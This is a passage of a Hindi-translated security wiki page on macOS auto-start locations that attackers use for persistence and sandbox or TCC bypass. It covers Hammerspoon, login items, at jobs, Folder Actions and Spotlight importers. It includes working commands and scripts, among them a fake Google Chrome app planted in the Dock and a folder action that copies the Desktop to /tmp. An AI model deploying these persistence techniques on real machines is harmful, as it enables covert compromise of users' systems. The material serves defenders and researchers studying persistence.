[**हैमरस्पून**](https://github.com/Hammerspoon/hammerspoon) **macOS** के लिए एक स्वचालन प्लेटफ़ॉर्म के रूप में काम करता है, जिसमें इसके परिचालन के लिए **LUA स्क्रिप्टिंग भाषा** का उपयोग किया जाता है। विशेष रूप से, यह पूरे AppleScript कोड का एकीकरण समर्थित करता है और शैल स्क्रिप्टों का क्रियान्वयन करता है, जिससे इसकी स्क्रिप्टिंग क्षमताएँ काफी बढ़ जाती हैं।

ऐप एक एकल फ़ाइल, `~/.hammerspoon/init.lua`, की खोज करता है, और जब शुरू किया जाता है, तो स्क्रिप्ट क्रियान्वित होगा।
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

* बैग सैंडबॉक्स को छलना करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* लेकिन BetterTouchTool को स्थापित होना चाहिए
* TCC बायपास: [✅](https://emojipedia.org/check-mark-button)
* यह Automation-Shortcuts और Accessibility अनुमतियाँ मांगता है

#### स्थान

* `~/Library/Application Support/BetterTouchTool/*`

यह उपकरण ऐप्लिकेशन या स्क्रिप्ट को संकेतित करने की अनुमति देता है जब कुछ शॉर्टकट्स दबाए जाते हैं। एक हमलावर अपने खुद के **शॉर्टकट और क्रिया को डेटाबेस में निष्पादित करने के लिए** कॉन्फ़िगर कर सकता है ताकि यह विचारशील कोड निष्पादित करे (एक शॉर्टकट सिर्फ एक कुंजी दबाने के लिए हो सकता है)।

### Alfred

* बैग सैंडबॉक्स को छलना करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* लेकिन Alfred को स्थापित होना चाहिए
* TCC बायपास: [✅](https://emojipedia.org/check-mark-button)
* यह Automation, Accessibility और फुल-डिस्क एक्सेस अनुमतियाँ मांगता है

#### स्थान

* `???`

यह शर्तों को पूरा करने पर कोड निष्पादित करने के लिए वर्कफ़्लो बनाने की अनुमति देता है। संभावना है कि एक हमलावर एक वर्कफ़्लो फ़ाइल बना सकता है और Alfred को इसे लोड करने के लिए कर सकता है (वर्कफ़्लो का उपयोग करने के लिए प्रीमियम संस्करण का उपयोग करना आवश्यक है)।

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond\_0006/](https://theevilbit.github.io/beyond/beyond\_0006/)

* बैग सैंडबॉक्स को छलना करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* लेकिन ssh को सक्षम और उपयोग किया जाना चाहिए
* TCC बायपास: [✅](https://emojipedia.org/check-mark-button)
* SSH को FDA एक्सेस होने की आवश्यकता है

#### स्थान

* **`~/.ssh/rc`**
* **ट्रिगर**: SSH के माध्यम से लॉगिन
* **`/etc/ssh/sshrc`**
* रूट की आवश्यकता है
* **ट्रिगर**: SSH के माध्यम से लॉगिन

{% hint style="danger" %}
SSH को चालू करने के लिए पूर्ण डिस्क एक्सेस की आवश्यकता है:
```bash
sudo systemsetup -setremotelogin on
```
{% endhint %}

#### विवरण और शोषण

डिफ़ॉल्ट रूप से, जब तक `/etc/ssh/sshd_config` में `PermitUserRC no` न हो, जब एक उपयोगकर्ता **SSH के माध्यम से लॉगिन करता है** तो स्क्रिप्ट **`/etc/ssh/sshrc`** और **`~/.ssh/rc`** क्रियान्वित हो जाएंगे।

### **लॉगिन आइटम्स**

लेख: [https://theevilbit.github.io/beyond/beyond\_0003/](https://theevilbit.github.io/beyond/beyond\_0003/)

* सैंडबॉक्स को उमारने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* लेकिन आपको `osascript` को तार्किक के साथ क्रियान्वित करना होगा
* TCC बाईपास: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

* **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
* **ट्रिगर:** लॉगिन
* शोषण पेलोड संग्रहित करने के लिए **`osascript`** को कॉल किया गया है
* **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
* **ट्रिगर:** लॉगिन
* रूट की आवश्यकता है

#### विवरण

सिस्टम प्राथमिकताएँ -> उपयोगकर्ता और समूह -> **लॉगिन आइटम्स** में आप **उपयोगकर्ता लॉग इन करते समय क्रियान्वित करने के लिए आइटम्स** पा सकते हैं।\
इन्हें सूचीत करना, कमांड लाइन से जोड़ना और हटाना संभव है:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
ये आइटम फ़ाइल में स्टोर होते हैं **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

**लॉगिन आइटम** को भी इस्तेमाल करके दिखाया जा सकता है API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) जो कॉन्फ़िगरेशन को स्टोर करेगा **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**

### ZIP के रूप में लॉगिन आइटम

(लॉगिन आइटम के बारे में पिछले खंड की जाँच करें, यह एक विस्तार है)

अगर आप एक **ZIP** फ़ाइल को एक **लॉगिन आइटम** के रूप में स्टोर करते हैं तो **`Archive Utility`** इसे खोलेगा और यदि ज़िप उदाहरण के लिए **`~/Library`** में स्टोर किया गया था और फ़ोल्डर **`LaunchAgents/file.plist`** शामिल था जिसमें एक बैकडोर था, तो वह फ़ोल्डर बनाया जाएगा (यह डिफ़ॉल्ट नहीं है) और प्लिस्ट जोड़ दी जाएगी ताकि अगली बार जब उपयोगकर्ता फिर से लॉग इन करेगा, **प्लिस्ट में दिखाए गए बैकडोर को निष्पादित किया जाएगा**।

एक और विकल्प हो सकता है कि उपयोगकर्ता होम में फ़ाइलें **`.bash_profile`** और **`.zshenv`** बनाएं ताकि यदि फ़ोल्डर LaunchAgents पहले से मौजूद है तो यह तकनीक फिर भी काम करेगी।

### At

लेख: [https://theevilbit.github.io/beyond/beyond\_0014/](https://theevilbit.github.io/beyond/beyond\_0014/)

* सैंडबॉक्स को बायपास करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* लेकिन आपको **`at`** को **एक्सीक्यूट** करना होगा और यह **एनेबल** होना चाहिए
* TCC बायपास: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

* आपको **`at`** को **एक्सीक्यूट** करना होगा और यह **एनेबल** होना चाहिए

#### **विवरण**

`at` tasks को **निश्चित समय पर निष्पादित करने के लिए शेड्यूल करने** के लिए डिज़ाइन किया गया है। क्रॉन जॉब्स की तरह, `at` tasks को पोस्ट-निष्पादन स्वचालित रूप से हटा दिया जाता है। यह महत्वपूर्ण है कि ये tasks सिस्टम रीबूट के बाद भी स्थायी होते हैं, जिन्हें कुछ शर्तों के तहत सुरक्षा संबंधित चिंताओं के रूप में चिह्नित किया जाता है।

**डिफ़ॉल्ट** रूप से वे **डिसेबल** होते हैं लेकिन **रूट** उपयोगकर्ता उन्हें **एनेबल** कर सकता है **इन्हें** के साथ:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
यह 1 घंटे में एक फ़ाइल बनाएगा:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
कार्य कतार की जाँच करें `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
ऊपर हम दो नौकरियां निर्धारित की गई हैं। हम `at -c JOBNUMBER` का उपयोग करके नौकरी का विवरण प्रिंट कर सकते हैं।
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
{% hint style="warning" %}
यदि AT tasks सक्षम नहीं हैं तो बनाए गए tasks को क्रियान्वित नहीं किया जाएगा।
{% endhint %}

**नौकरी फ़ाइलें** `/private/var/at/jobs/` पर मिल सकती हैं।
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
फ़ाइल का नाम कतार, नौकरी संख्या, और यह समय शामिल है जिसे यह चालू होने के लिए निर्धारित किया गया है। उदाहरण के लिए चलो `a0001a019bdcd2` को देखते हैं।

* `a` - यह कतार है
* `0001a` - हेक्स में नौकरी संख्या, `0x1a = 26`
* `019bdcd2` - हेक्स में समय। यह एपॉक के बाद बीते मिनटों को प्रतिनिधित करता है। `0x019bdcd2` दसमलव में `26991826` है। यदि हम इसे 60 से गुणा करें तो हमें `1619509560` मिलता है, जो `GMT: 2021. अप्रैल 27, मंगलवार 7:46:00` है।

अगर हम नौकरी फ़ाइल को प्रिंट करें, तो हमें `at -c` का उपयोग करके प्राप्त की गई जानकारी मिलती है।

### फ़ोल्डर क्रियाएँ

लेख: [https://theevilbit.github.io/beyond/beyond\_0024/](https://theevilbit.github.io/beyond/beyond\_0024/)\
लेख: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

* सैंडबॉक्स को छलने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* लेकिन आपको **`System Events`** से संपर्क करने के लिए `osascript` को तर्कों के साथ बुलाने की आवश्यकता है ताकि आप फ़ोल्डर क्रियाएँ कॉन्फ़िगर कर सकें
* TCC छलांग: [🟠](https://emojipedia.org/large-orange-circle)
* इसमें कुछ मौलिक TCC अनुमतियाँ हैं जैसे डेस्कटॉप, दस्तावेज़ और डाउनलोड्स

#### स्थान

* **`/Library/Scripts/Folder Action Scripts`**
* रूट की आवश्यकता है
* **ट्रिगर**: निर्दिष्ट फ़ोल्डर तक पहुंच
* **`~/Library/Scripts/Folder Action Scripts`**
* **ट्रिगर**: निर्दिष्ट फ़ोल्डर तक पहुंच

#### विवरण और शोषण

फ़ोल्डर क्रियाएँ स्क्रिप्ट हैं जो फ़ोल्डर में परिवर्तनों द्वारा स्वचालित रूप से ट्रिगर होते हैं जैसे आइटम जोड़ना, हटाना, या अन्य क्रियाएँ जैसे फ़ोल्डर विंडो खोलना या आकार बदलना। ये क्रियाएँ विभिन्न कार्यों के लिए उपयोगी हो सकती हैं, और इन्हें विभिन्न तरीकों से ट्रिगर किया जा सकता है जैसे फाइंडर UI या टर्मिनल कमांड्स का उपयोग करके।

फ़ोल्डर क्रियाएँ सेट करने के लिए, आपके पास विकल्प हैं जैसे:

1. [Automator](https://support.apple.com/guide/automator/welcome/mac) के साथ एक फ़ोल्डर क्रिया वर्कफ़्लो बनाना और इसे एक सेवा के रूप में स्थापित करना।
2. फ़ोल्डर क्रियाएँ सेटअप में एक संदर्भ मेनू के माध्यम से स्क्रिप्ट को मैन्युअल रूप से जोड़ना।
3. प्रोग्रामेटिक रूप से फ़ोल्डर क्रिया सेटअप करने के लिए `System Events.app` को Apple इवेंट संदेश भेजने के लिए OSAScript का उपयोग करना।
* यह विधि विशेष रूप से सिस्टम में क्रिया को समाहित करने के लिए उपयोगी है।

निम्नलिखित स्क्रिप्ट एक उदाहरण है कि फ़ोल्डर क्रिया द्वारा क्या क्रियाएँ की जा सकती हैं:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
ऊपर दिए गए स्क्रिप्ट को फ़ोल्डर क्रियाएँ द्वारा उपयोग के लिए कंपाइल करने के लिए:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
धारित को कंपाइल करने के बाद, नीचे दिए गए स्क्रिप्ट को निष्पादित करके फोल्डर क्रियाएँ सेटअप करें। यह स्क्रिप्ट फोल्डर क्रियाएँ को वैश्विक रूप से सक्षम करेगा और पिछले संकलित स्क्रिप्ट को विशेष रूप से डेस्कटॉप फोल्डर से जोड़ेगा।
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events");
se.folderActionsEnabled = true;
var myScript = se.Script({name: "source.js", posixPath: "/tmp/source.js"});
var fa = se.FolderAction({name: "Desktop", path: "/Users/username/Desktop"});
se.folderActions.push(fa);
fa.scripts.push(myScript);
```
उपस्थापन स्क्रिप्ट को निम्नलिखित के साथ चलाएँ:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
* यह उस स्थिरता को GUI के माध्यम से कैसे लागू किया जाएगा:

यह स्क्रिप्ट है जो निष्पादित किया जाएगा:

{% code title="source.js" %}
```applescript
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
{% endcode %}

इसे इस प्रकार कंपाइल करें: `osacompile -l JavaScript -o folder.scpt source.js`

इसे इस स्थान पर ले जाएँ:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
तो, `Folder Actions Setup` ऐप्लिकेशन खोलें, **वह फ़ोल्डर चुनें जिसे आप देखना चाहें** और अपने मामले में **`folder.scpt`** को चुनें (मेरे मामले में मैंने इसे output2.scp कहा था):

<figure><img src="../.gitbook/assets/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

अब, अगर आप **Finder** के साथ उस फ़ोल्डर को खोलें, तो आपका स्क्रिप्ट चलाया जाएगा।

यह विन्यास **plist** में संग्रहीत था जो **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** में base64 प्रारूप में स्थित है।

अब, आइए इस स्थिरता को GUI एक्सेस के बिना तैयार करने का प्रयास करें:

1. **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** की **`/tmp`** में बैकअप बनाने के लिए **कॉपी करें**:
* `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. आपने जो Folder Actions सेट किए हैं, उन्हें **हटाएं**:

<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

अब जब हमारे पास एक खाली वातावरण है

3. बैकअप फ़ाइल कॉपी करें: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. इस कॉन्फ़िगरेशन को उपभोक्ता करने के लिए Folder Actions Setup.app खोलें: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

{% hint style="danger" %}
और यह मेरे लिए काम नहीं किया, लेकिन ये व्राइटअप से निर्देश हैं:(
{% endhint %}

### डॉक शॉर्टकट्स

Writeup: [https://theevilbit.github.io/beyond/beyond\_0027/](https://theevilbit.github.io/beyond/beyond\_0027/)

* सैंडबॉक्स को छलने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* लेकिन आपको सिस्टम के अंदर एक हानिकारक एप्लिकेशन इंस्टॉल करना चाहिए
* TCC बायपास: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

* `~/Library/Preferences/com.apple.dock.plist`
* **ट्रिगर**: जब उपयोगकर्ता डॉक के अंदर ऐप पर क्लिक करता है

#### विवरण और शोषण

डॉक में जो सभी एप्लिकेशन दिखाई देते हैं, वे सभी plist में निर्दिष्ट किए गए हैं: **`~/Library/Preferences/com.apple.dock.plist`**

एक एप्लिकेशन जोड़ना संभव है बस इसके साथ:

{% code overflow="wrap" %}
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
{% endcode %}

कुछ **सामाजिक इंजीनियरिंग** का उपयोग करके आप **उदाहरण के लिए Google Chrome का अनुकरण** डॉक के अंदर कर सकते हैं और वास्तव में अपनी स्क्रिप्ट को क्रियान्वित कर सकते हैं:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### रंग चुनने वाले

लेख: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.github.io/beyond/beyond\_0017/)

* सैंडबॉक्स को छलने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
* एक बहुत विशिष्ट क्रिया होनी चाहिए
* आप एक और सैंडबॉक्स में समाप्त हो जाएंगे
* TCC बायपास: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

* `/Library/ColorPickers`
* रूट की आवश्यकता है
* ट्रिगर: रंग चुनने वाला उपयोग करें
* `~/Library/ColorPickers`
* ट्रिगर: रंग चुनने वाला उपयोग करें

#### विवरण और शोषण

**अपने कोड के साथ एक रंग चुनने वाले** बंडल को कंपाइल करें (आप [**इसका उदाहरण ले सकते हैं**](https://github.com/viktorstrate/color-picker-plus)) और एक निर्माता जोड़ें (जैसे [स्क्रीन सेवर खंड](macos-auto-start-locations.md#screen-saver) में) और बंडल को `~/Library/ColorPickers` में कॉपी करें।

फिर, जब रंग चुनने वाला ट्रिगर होता है, तो आपका कोड भी होना चाहिए।

ध्यान दें कि आपकी पुस्तकालय को लोड करने वाला बाइनरी **बहुत प्रतिबंधक सैंडबॉक्स** है: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

{% code overflow="wrap" %}
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
{% endcode %}

### फाइंडर सिंक प्लगइन

**लेख**: [https://theevilbit.github.io/beyond/beyond\_0026/](https://theevilbit.github.io/beyond/beyond\_0026/)\
**लेख**: [https://objective-see.org/blog/blog\_0x11.html](https://objective-see.org/blog/blog\_0x11.html)

* सैंडबॉक्स को छलने के लिए उपयोगी: **नहीं, क्योंकि आपको अपने खुद के ऐप्लिकेशन को चलाना होगा**
* TCC बायपास: ???

#### स्थान

* एक विशिष्ट ऐप

#### विवरण और उत्पीड़न

एक ऐप्लिकेशन उदाहरण जिसमें फाइंडर सिंक एक्सटेंशन है [**यहाँ पाया जा सकता है**](https://github.com/D00MFist/InSync).

ऐप्लिकेशन में `फाइंडर सिंक एक्सटेंशन` हो सकता है। यह एक्सटेंशन एक ऐप्लिकेशन के अंदर जाएगा जो क्रियान्वित किया जाएगा। इसके अतिरिक्त, एक्सटेंशन अपना कोड निष्पादित करने के लिए **किसी वैध एप्पल डेवलपर प्रमाणपत्र के साथ साइन किया जाना चाहिए**, इसे **सैंडबॉक्स** में रखा जाना चाहिए (हालांकि ढीली छूटें जोड़ी जा सकती हैं) और ऐसा कुछ ऐसे के साथ पंजीकृत किया जाना चाहिए:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### स्क्रीन सेवर

लेख: [https://theevilbit.github.io/beyond/beyond\_0016/](https://theevilbit.github.io/beyond/beyond\_0016/)\
लेख: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

* सैंडबॉक्स को बाईपास करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
* लेकिन आप एक सामान्य एप्लिकेशन सैंडबॉक्स में खत्म हो जाएंगे
* TCC बाईपास: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

* `/System/Library/Screen Savers`
* रूट की आवश्यकता
* **ट्रिगर**: स्क्रीन सेवर का चयन करें
* `/Library/Screen Savers`
* रूट की आवश्यकता
* **ट्रिगर**: स्क्रीन सेवर का चयन करें
* `~/Library/Screen Savers`
* **ट्रिगर**: स्क्रीन सेवर का चयन करें

<figure><img src="../.gitbook/assets/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### विवरण और एक्सप्लॉइट

Xcode में एक नया परियोजना बनाएं और एक नया **स्क्रीन सेवर** उत्पन्न करने के लिए टेम्पलेट का चयन करें। फिर, इसे अपने कोड में जोड़ें, उदाहरण के लिए निम्नलिखित कोड तक लॉग उत्पन्न करने के लिए।

**इसे** बनाएं, और `.saver` बंडल को **`~/Library/Screen Savers`** में कॉपी करें। फिर, स्क्रीन सेवर GUI खोलें और इस पर क्लिक करें, यह बहुत सारे लॉग उत्पन्न करना चाहिए:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
{% endcode %}

{% hint style="danger" %}
ध्यान दें कि इस कोड को लोड करने वाले बाइनरी की entitlements में (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) आपको **`com.apple.security.app-sandbox`** मिलेगा जिससे आप **सामान्य एप्लिकेशन सैंडबॉक्स के अंदर** होंगे।
{% endhint %}

Saver code:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### स्पॉटलाइट प्लगइन्स

लेख: [https://theevilbit.github.io/beyond/beyond\_0011/](https://theevilbit.github.io/beyond/beyond\_0011/)

* सैंडबॉक्स को छलने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
* लेकिन आप एक एप्लिकेशन सैंडबॉक्स में खत्म हो जाएंगे
* TCC बायपास: [🔴](https://emojipedia.org/large-red-circle)
* सैंडबॉक्स बहुत सीमित लगती है

#### स्थान

* `~/Library/Spotlight/`
* **ट्रिगर**: स्पॉटलाइट प्लगइन द्वारा प्रबंधित एक नया फ़ाइल बनाई जाती है।
* `/Library/Spotlight/`
* **ट्रिगर**: स्पॉटलाइट प्लगइन द्वारा प्रबंधित एक नया फ़ाइल बनाई जाती है।
* रूट की आवश्यकता है
* `/System/Library/Spotlight/`
* **ट्रिगर**: स्पॉटलाइट प्लगइन द्वारा प्रबंधित एक नया फ़ाइल बनाई जाती है।
* रूट की आवश्यकता है
* `Some.app/Contents/Library/Spotlight/`
* **ट्रिगर**: स्पॉटलाइट प्लगइन द्वारा प्रबंधित एक नया फ़ाइल बनाई जाती है।
* नई एप्लिकेशन की आवश्यकता है

#### विवरण और शोषण

स्पॉटलाइट macOS की बिल्ट-इन खोज सुविधा है, जो उपयोगकर्ताओं को उनके कंप्यूटर पर डेटा तक तेजी से और व्यापक रूप से पहुंचने की सुविधा प्रदान करने के लिए डिज़ाइन की गई है।\
इस त्वरित खोज क्षमता को सुविधाजनक बनाने के लिए, स्पॉटलाइट एक **प्रोप्रायटरी डेटाबेस** बनाए रखता है और एक अनुक्रम बनाता है **अधिकांश फ़ाइलों को पार्स करके**, फ़ाइलों के नाम और उनकी सामग्री के माध्यम से त्वरित खोज करने की संभावना प्रदान करता है।

स्पॉटलाइट के अंतर्निहित मेकेनिज़्म में एक केंद्रीय प्रक्रिया होती है जिसका नाम 'mds' है, जो 'मेटाडेटा सर्वर' के लिए खड़ा है। इस प्रक्रिया के साथ, कई 'mdworker' डेमन होते हैं जो विभिन्न रखरखाव कार्य करते हैं, जैसे कि विभिन्न फ़ाइल प्रकारों को इंडेक्स करना (`ps -ef | grep mdworker`). ये कार्य स्पॉटलाइट इम्पोर्टर प्लगइन्स या **".mdimporter बंडल**" के माध्यम से संभव होते हैं, जो स्पॉटलाइट को विभिन्न फ़ाइल प्रारूपों के साथ सामग्री को समझने और इंडेक्स करने की सुविधा प्रदान करते हैं।

प्लगइन्स या **`.mdimporter`** बंडल पहले से उल्लिखित स्थानों में स्थित होते हैं और यदि एक नया बंडल दिखाई देता है तो इसे मिनट के भीतर लोड किया जाता है (किसी भी सेवा को पुनः आरंभ करने की आवश्यकता नहीं है)। ये बंडल्स इंडिकेट करने की आवश्यकता होती है कि वे कौन से **फ़ाइल प्रकार और एक्सटेंशन को प्रबंधित कर सकते हैं**, इस प्रकार, स्पॉटलाइट उन्हें उपयोग करेगा जब एक नयी फ़ाइल जिसमें उल्लिखित एक्सटेंशन होता है, बनाई जाती है।

सभी `mdimporters` को खोजना संभव है जोड़कर चलाते हुए:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
और उदाहरण के लिए **/Library/Spotlight/iBooksAuthor.mdimporter** इन प्रकार के फ़ाइलों को पार्स करने के लिए उपयोग किया जाता है (एक्सटेंशन `.iba` और `.book` आदि):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
